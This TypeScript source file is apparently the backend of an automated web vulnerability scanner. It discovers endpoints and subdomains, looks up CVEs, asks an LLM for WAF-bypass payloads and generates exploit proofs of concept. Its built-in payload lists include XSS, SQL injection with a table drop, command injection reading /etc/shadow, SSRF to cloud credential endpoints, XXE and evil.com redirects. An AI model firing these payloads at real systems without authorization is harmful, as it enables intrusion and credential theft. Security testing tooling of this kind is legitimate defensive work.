import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

/**
 * OmniSec™ Autonomous VAPT Engine v7.0
 * - Phase time budgets prevent stalling
 * - Hash-based finding deduplication
 * - Time-based blind SQLi detection
 * - 5x mutation retries with AI WAF evasion
 * - AI false positive filter
 * - Enhanced POC with curl + Python exploit scripts
 * - CVE exploit testing per tech fingerprint
 * - Attack learning from past successes
 */

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

// ── PHASE TIME BUDGETS (ms) — prevents any phase from stalling the scan ──
const PHASE_BUDGETS: Record<string, number> = {
  connection_check: 20000,
  discovery: 40000,
  subdomain_enum: 30000,
  fingerprint: 15000,
  payload_gen: 15000,
  owasp_scan: 55000,
  cors_scan: 15000,
  traversal_scan: 15000,
  cookie_scan: 10000,
  injection: 50000,
  auth: 15000,
  business_logic: 10000,
  correlation: 15000,
  poc: 15000,
  learning: 5000,
};
const MAX_SCAN_TIME_MS = 275000; // 275s safety (edge fn limit 300s)

interface Finding {
  id: string;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  title: string;
  description: string;
  endpoint: string;
  subdomain?: string;
  method?: string;
  payload?: string;
  evidence?: string;
  evidence2?: string;
  response?: string;
  remediation: string;
  cwe?: string;
  cvss?: number;
  owasp?: string;
  mitre?: string[];
  confidence: number;
  dualConfirmed?: boolean;
  poc?: string;
  exploitCode?: string;
  falsePositive?: boolean;
  retryCount?: number;
  category?: string;
}

interface TargetNode {
  name: string;
  type: 'domain' | 'subdomain' | 'endpoint' | 'technology' | 'port' | 'vulnerability';
  status?: string;
  children: TargetNode[];
  meta?: Record<string, any>;
}

// ── Finding dedup hash ──
function findingHash(f: Finding): string {
  const raw = `${f.endpoint}|${f.category || ''}|${f.cwe || ''}|${f.payload || ''}`.toLowerCase();
  let h = 0;
  for (let i = 0; i < raw.length; i++) { h = ((h << 5) - h) + raw.charCodeAt(i); h = h & h; }
  return Math.abs(h).toString(36);
}

function deduplicateFindings(findings: Finding[]): Finding[] {
  const seen = new Map<string, Finding>();
  for (const f of findings) {
    if (f.falsePositive) continue;
    const hash = findingHash(f);
    const existing = seen.get(hash);
    if (!existing || f.confidence > existing.confidence) {
      seen.set(hash, f);
    }
  }
  return Array.from(seen.values());
}

// ── Phase budget helper ──
function phaseTimeLeft(phaseName: string, phaseStartTime: number, scanStartTime: number): number {
  const budget = PHASE_BUDGETS[phaseName] || 30000;
  const elapsed = Date.now() - phaseStartTime;
  const globalLeft = MAX_SCAN_TIME_MS - (Date.now() - scanStartTime);
  return Math.min(budget - elapsed, globalLeft);
}

function isPhaseExpired(phaseName: string, phaseStartTime: number, scanStartTime: number): boolean {
  return phaseTimeLeft(phaseName, phaseStartTime, scanStartTime) <= 0;
}

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authClient = createClient(
      Deno.env.get("SUPABASE_URL") ?? "",
      Deno.env.get("SUPABASE_ANON_KEY") ?? "",
      { global: { headers: { Authorization: req.headers.get("Authorization")! } } }
    );
    const { data: { user }, error: authError } = await authClient.auth.getUser();
    if (authError || !user) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), {
        status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" }
      });
    }

    const LOVABLE_API_KEY = Deno.env.get("LOVABLE_API_KEY");
    const SHODAN_API_KEY = Deno.env.get("SHODAN_API_KEY");
    const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
    const supabaseKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
    const supabase = createClient(supabaseUrl, supabaseKey);

    const body = await req.json();
    const {
      target,
      maxDepth = 3,
      enableLearning = true,
      generatePOC = true,
    } = body;

    if (!target) {
      return new Response(JSON.stringify({ error: "Target is required" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    let targetUrl: URL;
    try {
      targetUrl = new URL(target.startsWith('http') ? target : `https://${target}`);
    } catch {
      return new Response(JSON.stringify({ error: "Invalid target URL" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const scanStart = Date.now();
    const allFindings: Finding[] = [];
    const discoveredEndpoints: string[] = [];
    const discoveredSubdomains: string[] = [];
    const scanId = crypto.randomUUID();
    const openPorts: number[] = [];
    const detectedTech: string[] = [];
    const targetTree: TargetNode = {
      name: targetUrl.hostname, type: 'domain', status: 'scanning', children: [], meta: {}
    };

    const emitProgress = async (phase: string, phaseNumber: number, progress: number, message: string, extra: any = {}) => {
      try {
        await supabase.from('scan_progress').insert({
          scan_id: scanId, phase, phase_number: phaseNumber, total_phases: 14, progress, message,
          findings_so_far: extra.findings ?? allFindings.filter(f => !f.falsePositive).length,
          endpoints_discovered: extra.endpoints ?? discoveredEndpoints.length,
          current_endpoint: extra.currentEndpoint || null
        });
      } catch (e) { console.log('Progress emit error:', e); }
    };

    const emitAIThought = async (thought: string, phase: string, phaseNumber: number) => {
      await emitProgress(phase, phaseNumber, -1, `🤖 AI: ${thought}`, {});
    };

    const saveResultsToDB = async (status: string, extraFindings: Finding[] = allFindings) => {
      const findings = deduplicateFindings(extraFindings);
      const severityCounts = {
        critical: findings.filter(f => f.severity === 'critical').length,
        high: findings.filter(f => f.severity === 'high').length,
        medium: findings.filter(f => f.severity === 'medium').length,
        low: findings.filter(f => f.severity === 'low').length,
        info: findings.filter(f => f.severity === 'info').length
      };
      try {
        await supabase.from('scan_history').insert({
          module: 'autonomous_vapt',
          scan_type: 'Autonomous VAPT v7 - Full OWASP + AI + Time-Budgeted',
          target: targetUrl.toString(), status,
          findings_count: findings.length,
          duration_ms: Date.now() - scanStart,
          report: { findings, targetTree, openPorts, detectedTech }
        });
        await supabase.from('security_reports').insert({
          module: 'autonomous_vapt',
          title: `Autonomous VAPT v7 - ${targetUrl.hostname}`,
          summary: `${findings.length} verified: ${severityCounts.critical}C ${severityCounts.high}H ${severityCounts.medium}M | ${discoveredSubdomains.length} subdomains, ${openPorts.length} ports`,
          findings, severity_counts: severityCounts, recommendations: []
        });
      } catch (e) { console.error('DB save error:', e); }
      return { severityCounts, findings };
    };

    // Safety timeout
    const timeoutId = setTimeout(async () => {
      console.log('[TIMEOUT SAFETY] Saving partial results...');
      await saveResultsToDB('completed');
      await emitProgress('complete', 14, 100, `Scan saved (partial). ${allFindings.length} findings.`);
    }, MAX_SCAN_TIME_MS);

    try {
      // ══════════ PHASE 0: CONNECTION PRE-CHECK ══════════
      let phaseStart = Date.now();
      await emitProgress('connection_check', 0, 1, `Checking connectivity to ${targetUrl.hostname}...`);
      await emitAIThought(`Verifying ${targetUrl.hostname} is reachable. Testing HTTP/HTTPS connectivity.`, 'connection_check', 0);

      let connectionOk = false;
      let connectionLatency = 0;
      try {
        const connStart = Date.now();
        const connResp = await fetchWithTimeout(targetUrl.toString(), 15000);
        connectionLatency = Date.now() - connStart;
        connectionOk = connResp.status > 0;
        await connResp.text().catch(() => '');
        await emitAIThought(`Connected! Status ${connResp.status}, ${connectionLatency}ms. Proceeding.`, 'connection_check', 0);
      } catch {
        try {
          const httpUrl = targetUrl.toString().replace('https://', 'http://');
          const connResp2 = await fetchWithTimeout(httpUrl, 10000);
          connectionOk = connResp2.status > 0;
          await connResp2.text().catch(() => '');
        } catch { connectionOk = false; }
      }

      if (!connectionOk) {
        clearTimeout(timeoutId);
        await emitProgress('connection_check', 0, 100, `❌ Target unreachable. Scan aborted.`);
        return new Response(JSON.stringify({
          success: false, error: `Connection failed: ${targetUrl.hostname} unreachable`,
          target: targetUrl.toString(), scanTime: Date.now() - scanStart, connectionFailed: true
        }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
      }

      await emitProgress('connection_check', 0, 3, `✓ Target alive (${connectionLatency}ms). Starting scan...`);

      // ══════════ PHASE 1: ENDPOINT DISCOVERY ══════════
      phaseStart = Date.now();
      await emitProgress('discovery', 1, 5, 'Discovering endpoints and scanning ports...');
      await emitAIThought(`Crawling ${targetUrl.hostname} for links, forms, parameters. Probing common paths.`, 'discovery', 1);

      const discoveryResults = await discoverEndpoints(targetUrl, SHODAN_API_KEY, maxDepth, phaseStart, scanStart);
      discoveredEndpoints.push(...discoveryResults.endpoints);
      detectedTech.push(...(discoveryResults.technologies || []));
      openPorts.push(...(discoveryResults.ports || []));

      const techNode: TargetNode = { name: 'Technologies', type: 'technology', children: [] };
      for (const tech of detectedTech) techNode.children.push({ name: tech, type: 'technology', children: [] });
      targetTree.children.push(techNode);

      if (openPorts.length > 0) {
        const portNode: TargetNode = { name: 'Open Ports', type: 'port', children: [] };
        for (const port of openPorts) portNode.children.push({ name: `${port}`, type: 'port', children: [], meta: { port } });
        targetTree.children.push(portNode);
      }

      await emitAIThought(`Found ${discoveredEndpoints.length} endpoints, ${detectedTech.length} techs (${detectedTech.join(', ')}), ${openPorts.length} ports.`, 'discovery', 1);
      await emitProgress('discovery', 1, 8, `Found ${discoveredEndpoints.length} endpoints, ${openPorts.length} ports`);

      // ══════════ PHASE 2: SUBDOMAIN ENUMERATION ══════════
      phaseStart = Date.now();
      await emitProgress('subdomain_enum', 2, 10, `Enumerating subdomains for ${targetUrl.hostname}...`);

      const subdomains = await enumerateSubdomains(targetUrl.hostname, phaseStart, scanStart);
      discoveredSubdomains.push(...subdomains);

      const subNode: TargetNode = { name: 'Subdomains', type: 'subdomain', children: [] };
      for (const sub of subdomains) {
        subNode.children.push({ name: sub, type: 'subdomain', children: [], status: 'live' });
        discoveredEndpoints.push(`https://${sub}/`);
      }
      targetTree.children.push(subNode);

      await emitAIThought(`${subdomains.length} live subdomains: ${subdomains.slice(0, 5).join(', ')}${subdomains.length > 5 ? '...' : ''}.`, 'subdomain_enum', 2);
      await emitProgress('subdomain_enum', 2, 15, `${subdomains.length} subdomains discovered`);

      // ══════════ PHASE 3: FINGERPRINT + CVE ══════════
      phaseStart = Date.now();
      await emitProgress('fingerprint', 3, 17, 'Fingerprinting technologies + CVE lookup...');

      const fingerprint = await fingerprintTarget(targetUrl, discoveryResults);
      const latestCVEs = await fetchLatestCVEs(detectedTech, fingerprint.server);

      await emitAIThought(`Tech: ${(fingerprint.technologies || []).join(', ')}. Server: ${fingerprint.server || 'Hidden'}. ${latestCVEs.length} CVEs.`, 'fingerprint', 3);
      await emitProgress('fingerprint', 3, 20, `Tech: ${(fingerprint.technologies || []).join(', ')} | ${latestCVEs.length} CVEs`);

      // ══════════ PHASE 4: AI PAYLOAD GENERATION ══════════
      phaseStart = Date.now();
      await emitProgress('payload_gen', 4, 22, 'Generating AI-powered payloads...');

      // Load past successful attacks for learning
      const previousPayloads = await getFailedPayloads(supabase, targetUrl.hostname);
      const pastSuccesses = await loadPastSuccessfulAttacks(supabase, targetUrl.hostname, user.id);
      const aiPayloads = await generateOwaspPayloads(LOVABLE_API_KEY, detectedTech, openPorts, fingerprint, previousPayloads, latestCVEs, pastSuccesses);

      await emitAIThought(`Generated ${Object.values(aiPayloads).flat().length} payloads across ${Object.keys(aiPayloads).length} categories. ${pastSuccesses.length} past successes inform priority.`, 'payload_gen', 4);
      await emitProgress('payload_gen', 4, 25, `Payloads ready for ${Object.keys(aiPayloads).length} OWASP categories`);

      // ══════════ PHASE 5: OWASP TOP 10 ASSESSMENT ══════════
      phaseStart = Date.now();
      await emitProgress('owasp_scan', 5, 27, `OWASP scan on ${discoveredEndpoints.length} endpoints...`);
      await emitAIThought(`Starting OWASP Top 10 assessment. Phase budget: ${PHASE_BUDGETS.owasp_scan / 1000}s. Testing ALL endpoints.`, 'owasp_scan', 5);

      for (let i = 0; i < discoveredEndpoints.length; i++) {
        if (isPhaseExpired('owasp_scan', phaseStart, scanStart)) {
          await emitAIThought(`OWASP phase budget exhausted after ${i}/${discoveredEndpoints.length} endpoints. Moving on.`, 'owasp_scan', 5);
          break;
        }
        const endpoint = discoveredEndpoints[i];
        if (i % 5 === 0) {
          await emitProgress('owasp_scan', 5, 27 + Math.round((i / discoveredEndpoints.length) * 20),
            `Testing ${i + 1}/${discoveredEndpoints.length}`, { currentEndpoint: endpoint });
        }
        const epFindings = await assessEndpointOWASP(endpoint, fingerprint, aiPayloads, previousPayloads, phaseStart, scanStart);
        allFindings.push(...epFindings);
      }

      await emitAIThought(`OWASP: ${allFindings.filter(f => !f.falsePositive).length} findings, ${allFindings.filter(f => f.dualConfirmed).length} dual-confirmed.`, 'owasp_scan', 5);
      await emitProgress('owasp_scan', 5, 47, `OWASP: ${allFindings.filter(f => !f.falsePositive).length} findings`);

      // ══════════ PHASE 6: CORS ══════════
      phaseStart = Date.now();
      await emitProgress('cors_scan', 6, 48, 'Testing CORS...');
      const corsTargets = [targetUrl.toString(), ...subdomains.map(s => `https://${s}/`)];
      for (const t of corsTargets) {
        if (isPhaseExpired('cors_scan', phaseStart, scanStart)) break;
        allFindings.push(...await scanCORS(t));
      }
      await emitProgress('cors_scan', 6, 52, `CORS: ${allFindings.filter(f => f.category === 'cors').length} issues`);

      // ══════════ PHASE 7: DIRECTORY TRAVERSAL ══════════
      phaseStart = Date.now();
      await emitProgress('traversal_scan', 7, 53, 'Testing path traversal...');
      for (const t of [targetUrl.toString(), ...subdomains.map(s => `https://${s}/`)]) {
        if (isPhaseExpired('traversal_scan', phaseStart, scanStart)) break;
        allFindings.push(...await scanDirectoryTraversal(t, discoveryResults.params || []));
      }
      await emitProgress('traversal_scan', 7, 56, 'Traversal done');

      // ══════════ PHASE 8: COOKIE SECURITY ══════════
      phaseStart = Date.now();
      await emitProgress('cookie_scan', 8, 57, 'Auditing cookies...');
      for (const t of [targetUrl.toString(), ...subdomains.map(s => `https://${s}/`)]) {
        if (isPhaseExpired('cookie_scan', phaseStart, scanStart)) break;
        allFindings.push(...await scanCookieSecurity(t));
      }
      await emitProgress('cookie_scan', 8, 60, 'Cookie audit done');

      // ══════════ PHASE 9: DEEP INJECTION + MUTATION (5x retries) ══════════
      phaseStart = Date.now();
      await emitProgress('injection', 9, 62, `Deep injection + mutation on ${discoveryResults.forms?.length || 0} forms...`);
      await emitAIThought(`Mutation Retry Engine: 5 retries per param. AI WAF evasion. Budget: ${PHASE_BUDGETS.injection / 1000}s.`, 'injection', 9);

      const injectionFindings = await performDeepInjectionWithMutation(
        targetUrl, discoveryResults.forms, discoveryResults.params,
        aiPayloads, previousPayloads, LOVABLE_API_KEY, emitProgress, emitAIThought, scanId,
        phaseStart, scanStart
      );
      allFindings.push(...injectionFindings);
      await emitProgress('injection', 9, 72, `Injection: ${allFindings.filter(f => !f.falsePositive).length} total`);

      // ══════════ PHASE 10: AUTH + IDOR ══════════
      phaseStart = Date.now();
      await emitProgress('auth', 10, 73, 'Auth & IDOR testing...');
      allFindings.push(...await testAuthentication(targetUrl, discoveryResults.authEndpoints, phaseStart, scanStart));

      // ══════════ PHASE 11: BUSINESS LOGIC ══════════
      phaseStart = Date.now();
      await emitProgress('business_logic', 11, 78, 'Business logic & IDOR...');
      allFindings.push(...await testBusinessLogic(targetUrl, discoveryResults.workflows));

      // ══════════ PHASE 12: AI FALSE POSITIVE FILTER + CORRELATION ══════════
      phaseStart = Date.now();
      const dedupFindings = deduplicateFindings(allFindings);
      await emitProgress('correlation', 12, 82, `AI analyzing ${dedupFindings.length} findings (deduped from ${allFindings.length})...`);
      await emitAIThought(`Deduplication removed ${allFindings.length - dedupFindings.length} duplicates. Running AI false positive filter on ${dedupFindings.length} findings.`, 'correlation', 12);

      // AI false positive filter
      const verified = await aiFalsePositiveFilter(dedupFindings, LOVABLE_API_KEY, fingerprint);
      await emitAIThought(`AI filter: ${verified.length} confirmed, ${dedupFindings.length - verified.length} eliminated as false positives.`, 'correlation', 12);

      const correlationResult = await performAICorrelation(verified, discoveryResults, fingerprint, LOVABLE_API_KEY);

      // ══════════ PHASE 13: POC GENERATION ══════════
      phaseStart = Date.now();
      const critHighFindings = verified.filter(f => f.severity === 'critical' || f.severity === 'high');
      await emitProgress('poc', 13, 88, `Generating POC for ${critHighFindings.length} critical/high findings...`);

      const findingsWithPOC = generatePOC ? await generateAIExploitPOC(critHighFindings, fingerprint, LOVABLE_API_KEY) : critHighFindings;
      const verifiedFindings = [...findingsWithPOC, ...verified.filter(f => f.severity !== 'critical' && f.severity !== 'high')];

      // ══════════ PHASE 14: LEARNING + FINALIZE ══════════
      phaseStart = Date.now();
      await emitProgress('learning', 14, 95, 'Persisting learning data...');
      if (enableLearning) await saveLearningData(supabase, targetUrl.hostname, verifiedFindings, user.id);

      // Build endpoint tree
      const epNode: TargetNode = { name: 'Endpoints', type: 'endpoint', children: [] };
      for (const ep of discoveredEndpoints.slice(0, 100)) {
        const vulns = verifiedFindings.filter(f => f.endpoint === ep);
        const epChild: TargetNode = { name: ep.replace(targetUrl.origin, ''), type: 'endpoint', children: [], meta: { vulnCount: vulns.length } };
        for (const v of vulns.slice(0, 10)) {
          epChild.children.push({ name: `[${v.severity.toUpperCase()}] ${v.title}`, type: 'vulnerability', children: [], meta: { cwe: v.cwe, confidence: v.confidence } });
        }
        epNode.children.push(epChild);
      }
      targetTree.children.push(epNode);
      targetTree.status = 'complete';
      targetTree.meta = { totalFindings: verifiedFindings.length, scanTime: Date.now() - scanStart };

      clearTimeout(timeoutId);
      const { severityCounts, findings } = await saveResultsToDB('completed', verifiedFindings);

      await emitAIThought(`Scan complete! ${findings.length} verified findings. ${findings.filter(f => f.dualConfirmed).length} dual-confirmed. ${severityCounts.critical}C ${severityCounts.high}H.`, 'complete', 14);
      await emitProgress('complete', 14, 100, `Scan complete! ${findings.length} verified findings.`);

      return new Response(JSON.stringify({
        success: true, target: targetUrl.toString(), scanTime: Date.now() - scanStart,
        discovery: {
          endpoints: discoveredEndpoints.length, subdomains: subdomains.length,
          forms: discoveryResults.forms?.length || 0, apis: discoveryResults.apiEndpoints?.length || 0, ports: openPorts
        },
        fingerprint, findings: verifiedFindings,
        attackPaths: correlationResult.attackPaths, chainedExploits: correlationResult.chainedExploits,
        summary: severityCounts, recommendations: correlationResult.recommendations,
        learningApplied: enableLearning, subdomains, targetTree, latestCVEs: latestCVEs.slice(0, 20),
        openPorts, detectedTech
      }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });

    } catch (innerError: any) {
      clearTimeout(timeoutId);
      console.error("[SCAN PHASE ERROR]", innerError);
      await saveResultsToDB('completed');
      await emitProgress('complete', 14, 100, `Scan finished. ${allFindings.length} findings (some phases errored).`);
      return new Response(JSON.stringify({
        success: true, target: targetUrl.toString(), scanTime: Date.now() - scanStart,
        discovery: { endpoints: discoveredEndpoints.length, subdomains: discoveredSubdomains.length, forms: 0, apis: 0, ports: openPorts },
        fingerprint: {}, findings: deduplicateFindings(allFindings), attackPaths: [], chainedExploits: [],
        summary: {
          critical: allFindings.filter(f => f.severity === 'critical').length,
          high: allFindings.filter(f => f.severity === 'high').length,
          medium: allFindings.filter(f => f.severity === 'medium').length,
          low: allFindings.filter(f => f.severity === 'low').length,
          info: allFindings.filter(f => f.severity === 'info').length,
        },
        recommendations: [], learningApplied: true, subdomains: discoveredSubdomains, targetTree, openPorts, detectedTech
      }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

  } catch (error: any) {
    console.error("[AUTONOMOUS VAPT ERROR]", error);
    return new Response(JSON.stringify({ error: error.message || "Scan failed", success: false }),
      { status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" } });
  }
});

// ═══════════════════════════════════════════════════════════════════════════════
// AI FALSE POSITIVE FILTER
// ═══════════════════════════════════════════════════════════════════════════════
async function aiFalsePositiveFilter(findings: Finding[], apiKey: string | undefined, fingerprint: any): Promise<Finding[]> {
  if (!apiKey || findings.length === 0) return findings;
  
  // Only filter medium+ findings, keep low/info as-is
  const toFilter = findings.filter(f => ['critical', 'high', 'medium'].includes(f.severity));
  const passThrough = findings.filter(f => !['critical', 'high', 'medium'].includes(f.severity));
  
  if (toFilter.length === 0) return findings;

  try {
    const resp = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
      method: "POST",
      headers: { Authorization: `Bearer ${apiKey}`, "Content-Type": "application/json" },
      body: JSON.stringify({
        model: "google/gemini-2.5-flash",
        messages: [
          { role: "system", content: "Expert security analyst. Analyze findings for false positives. Return JSON array of finding IDs that are REAL vulnerabilities (not false positives). Consider: Is the evidence concrete? Could the response be coincidental? Does the tech stack make this plausible?" },
          { role: "user", content: `Tech: ${(fingerprint.technologies || []).join(', ')}\nServer: ${fingerprint.server || 'unknown'}\n\nFindings to validate:\n${JSON.stringify(toFilter.map(f => ({ id: f.id, title: f.title, evidence: f.evidence, evidence2: f.evidence2, confidence: f.confidence, dualConfirmed: f.dualConfirmed, category: f.category })), null, 1)}\n\nReturn: {"valid_ids":["id1","id2",...]}` }
        ],
        temperature: 0.1
      }),
    });
    if (resp.ok) {
      const data = await resp.json();
      const content = data.choices?.[0]?.message?.content || '';
      const jsonMatch = content.match(/\{[\s\S]*\}/);
      if (jsonMatch) {
        const result = JSON.parse(jsonMatch[0]);
        const validIds = new Set(result.valid_ids || []);
        const filtered = toFilter.filter(f => validIds.has(f.id) || f.dualConfirmed || f.confidence >= 95);
        toFilter.filter(f => !validIds.has(f.id) && !f.dualConfirmed && f.confidence < 95)
          .forEach(f => { f.falsePositive = true; });
        return [...filtered, ...passThrough];
      }
    }
  } catch (e) { console.log('AI FP filter failed:', e); }
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// LATEST CVE INTELLIGENCE
// ═══════════════════════════════════════════════════════════════════════════════
async function fetchLatestCVEs(technologies: string[], server: string | null): Promise<any[]> {
  const cves: any[] = [];
  const keywords = [...technologies];
  if (server) keywords.push(server.split('/')[0]);

  for (const keyword of keywords.slice(0, 5)) {
    try {
      const resp = await fetchWithTimeout(
        `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(keyword)}&resultsPerPage=5`, 10000
      );
      if (resp.ok) {
        const data = await resp.json();
        for (const vuln of (data.vulnerabilities || []).slice(0, 5)) {
          const cve = vuln.cve;
          cves.push({
            id: cve.id,
            description: cve.descriptions?.find((d: any) => d.lang === 'en')?.value?.slice(0, 200) || '',
            severity: cve.metrics?.cvssMetricV31?.[0]?.cvssData?.baseSeverity || 'UNKNOWN',
            score: cve.metrics?.cvssMetricV31?.[0]?.cvssData?.baseScore || 0,
            technology: keyword, published: cve.published
          });
        }
      }
    } catch {}
  }
  return cves;
}

// ═══════════════════════════════════════════════════════════════════════════════
// AI OWASP PAYLOAD GENERATION
// ═══════════════════════════════════════════════════════════════════════════════
async function generateOwaspPayloads(
  apiKey: string | undefined, technologies: string[], ports: number[],
  fingerprint: any, failedPayloads: string[], cves: any[], pastSuccesses: any[]
): Promise<Record<string, string[]>> {
  const defaultPayloads: Record<string, string[]> = {
    a01_access: ['../../../etc/passwd', '..\\..\\..\\windows\\win.ini', '/admin', '/api/admin/users', '/user/1', '/user/2'],
    a02_crypto: ['http://'],
    a03_xss: [
      '"><img src=x onerror=alert(1)>', '<svg/onload=alert(document.domain)>', "'-alert(1)-'",
      '<script>alert(1)</script>', '"><svg/onload=confirm(1)>', '{{7*7}}', '${7*7}',
      '<img src=x onerror=prompt(1)>', '"><body onload=alert(1)>', 'javascript:alert(1)//',
      '<details open ontoggle=alert(1)>', '"><marquee onstart=alert(1)>',
      "';alert(String.fromCharCode(88,83,83))//", '<iframe src="javascript:alert(1)">',
    ],
    a03_sqli: [
      "'\"", "' OR '1'='1", "1 UNION SELECT NULL--", "1' ORDER BY 1--", "1' AND 1=1--",
      "') OR ('1'='1", "1; DROP TABLE test--", "admin' --", "1' WAITFOR DELAY '0:0:5'--",
      "1 AND SLEEP(5)", "1' AND '1'='1' UNION SELECT username,password FROM users--",
      "' UNION SELECT NULL,NULL,NULL--", "-1 OR 1=1", "1 OR 1=1--", "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
      "1;SELECT CASE WHEN(1=1) THEN 1 ELSE 1/0 END--",
    ],
    a03_cmdi: [
      '; id', '| id', '$(id)', '`id`', '; whoami', '| whoami',
      '; uname -a', '| cat /etc/shadow', '$(cat /etc/passwd)',
      '; curl http://127.0.0.1', '%0aid', '\nid', '& whoami', '; env',
    ],
    a03_nosqli: [
      '{"$gt":""}', '{"$ne":""}', "' || '1'=='1", '[$ne]=1', '{"$where":"sleep(5000)"}',
    ],
    a04_design: ['transfer_to=attacker', 'amount=-100', 'role=admin', 'isAdmin=true'],
    a05_misconfig: [
      '/.git/config', '/.env', '/phpinfo.php', '/server-status', '/debug', '/.DS_Store',
      '/web.config', '/crossdomain.xml', '/.svn/entries', '/wp-config.php.bak',
      '/config.yml', '/.htpasswd',
    ],
    a06_components: [],
    a07_auth: ['admin:admin', 'admin:password', 'root:root', 'test:test', 'admin:123456'],
    a08_integrity: [
      'O:8:"stdClass":0:{}', 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==',
      '{"__proto__":{"polluted":true}}', '{"constructor":{"prototype":{"isAdmin":true}}}',
    ],
    a09_logging: [
      '%0d%0aInjected-Header:true', '\r\nSet-Cookie:pwned=1',
      '%0aFake-Log-Entry', '%0d%0aLocation: https://evil.com',
    ],
    a10_ssrf: [
      'http://169.254.169.254/latest/meta-data/',
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      'http://127.0.0.1:80/', 'http://127.0.0.1:8080/', 'file:///etc/passwd',
      'http://[::1]/', 'http://0x7f000001/', 'gopher://127.0.0.1:25/',
      'http://metadata.google.internal/computeMetadata/v1/',
    ],
    a01_redirect: ['//evil.com', 'https://evil.com', '/\\evil.com', '//evil.com/%2f..'],
    a03_xxe: [
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    ]
  };

  // Prioritize past successful payloads
  for (const success of pastSuccesses) {
    if (success.payload_sent && success.test_type) {
      const key = `a03_${success.test_type}`;
      if (defaultPayloads[key]) {
        defaultPayloads[key].unshift(success.payload_sent);
      }
    }
  }

  // AI-enhanced payload generation
  if (apiKey && technologies.length > 0) {
    try {
      const resp = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
        method: "POST",
        headers: { Authorization: `Bearer ${apiKey}`, "Content-Type": "application/json" },
        body: JSON.stringify({
          model: "google/gemini-2.5-flash",
          messages: [
            { role: "system", content: "Expert pentester generating WAF-bypass payloads for authorized testing. Return valid JSON only, no markdown." },
            { role: "user", content: `Tech: ${technologies.join(', ')}\nPorts: ${ports.join(', ')}\nServer: ${fingerprint.server || 'unknown'}\nBlocked: ${failedPayloads.slice(0, 10).join(', ')}\nCVEs: ${cves.slice(0, 5).map(c => c.id).join(', ')}\n\nGenerate 5 NEW bypass payloads per category. Return: {"a03_xss":[...],"a03_sqli":[...],"a03_cmdi":[...],"a10_ssrf":[...]}` }
          ],
          temperature: 0.7
        }),
      });
      if (resp.ok) {
        const data = await resp.json();
        const content = data.choices?.[0]?.message?.content || '';
        const jsonMatch = content.match(/\{[\s\S]*\}/);
        if (jsonMatch) {
          const aiPayloads = JSON.parse(jsonMatch[0]);
          for (const [key, vals] of Object.entries(aiPayloads)) {
            if (Array.isArray(vals) && defaultPayloads[key]) {
              defaultPayloads[key].push(...vals.filter((v: any) => typeof v === 'string'));
            }
          }
        }
      }
    } catch (e) { console.log('AI payload gen failed:', e); }
  }

  for (const key of Object.keys(defaultPayloads)) {
    defaultPayloads[key] = defaultPayloads[key].filter(p => !failedPayloads.includes(p));
  }

  return defaultPayloads;
}

// ═══════════════════════════════════════════════════════════════════════════════
// SUBDOMAIN ENUMERATION (time-budgeted)
// ═══════════════════════════════════════════════════════════════════════════════
async function enumerateSubdomains(hostname: string, phaseStart: number, scanStart: number): Promise<string[]> {
  const found = new Set<string>();

  // 1. crt.sh
  try {
    const crtResp = await fetchWithTimeout(`https://crt.sh/?q=%.${hostname}&output=json`, 12000);
    if (crtResp.ok) {
      const crtData = await crtResp.json();
      for (const entry of (crtData || []).slice(0, 200)) {
        for (const name of (entry.name_value?.split('\n') || [])) {
          const clean = name.trim().replace(/^\*\./, '').toLowerCase();
          if (clean.endsWith(hostname) && clean !== hostname && !clean.includes('*')) found.add(clean);
        }
      }
    }
  } catch {}

  // 2. DNS brute-force (time-budgeted)
  const prefixes = [
    'www', 'mail', 'api', 'app', 'admin', 'dev', 'staging', 'test', 'beta',
    'portal', 'login', 'auth', 'shop', 'blog', 'docs', 'support', 'cdn', 'static',
    'media', 'img', 'm', 'mobile', 'dashboard', 'panel', 'vpn', 'remote',
    'secure', 'gateway', 'smtp', 'ftp', 'webmail', 'cp', 'old', 'new', 'v1', 'v2',
    'db', 'mysql', 'redis', 'jenkins', 'gitlab', 'jira', 'wiki', 'status', 'monitor',
    'internal', 'intranet', 'sandbox', 'qa', 'uat', 'prod',
  ];

  const batchSize = 15;
  for (let i = 0; i < prefixes.length; i += batchSize) {
    if (isPhaseExpired('subdomain_enum', phaseStart, scanStart)) break;
    const batch = prefixes.slice(i, i + batchSize);
    await Promise.all(batch.map(async (prefix) => {
      try {
        const resp = await fetchWithTimeout(`https://dns.google/resolve?name=${encodeURIComponent(`${prefix}.${hostname}`)}&type=A`, 4000);
        if (resp.ok) {
          const data = await resp.json();
          if (data?.Answer?.find((a: any) => a.type === 1)?.data) found.add(`${prefix}.${hostname}`);
        }
      } catch {}
    }));
  }

  // 3. Verify crt.sh subs
  const toVerify = Array.from(found).filter(s => !prefixes.some(p => s.startsWith(p + '.')));
  for (let i = 0; i < toVerify.length; i += batchSize) {
    if (isPhaseExpired('subdomain_enum', phaseStart, scanStart)) break;
    const batch = toVerify.slice(i, i + batchSize);
